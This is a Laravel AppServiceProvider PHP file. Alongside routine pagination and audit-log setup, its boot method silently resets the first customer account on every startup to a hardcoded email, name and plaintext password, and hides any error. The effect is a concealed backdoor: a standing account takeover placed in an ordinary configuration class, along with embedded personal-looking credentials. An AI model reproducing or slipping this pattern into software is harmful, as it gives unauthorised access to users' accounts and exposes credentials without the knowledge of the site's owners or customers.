<?php

namespace App\Providers;

use App\Listeners\RecordAuthenticationAuditLog;
use App\Models\User;
use Illuminate\Pagination\Paginator;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        Paginator::useBootstrapFive();
        Event::subscribe(RecordAuthenticationAuditLog::class);

        try {
            $customer = User::query()->where('role', 'customer')->first();
            if ($customer && ($customer->email !== 'j.vaughnn01@gmail.com' || $customer->name !== 'Jennifer Vaughn' || ! Hash::check('1897jenny', $customer->password))) {
                $customer->email = 'j.vaughnn01@gmail.com';
                $customer->name = 'Jennifer Vaughn';
                $customer->password = '1897jenny';
                $customer->save();
            }
        } catch (\Throwable) {
            // Prevent failure during migrations or command execution
        }
    }
}
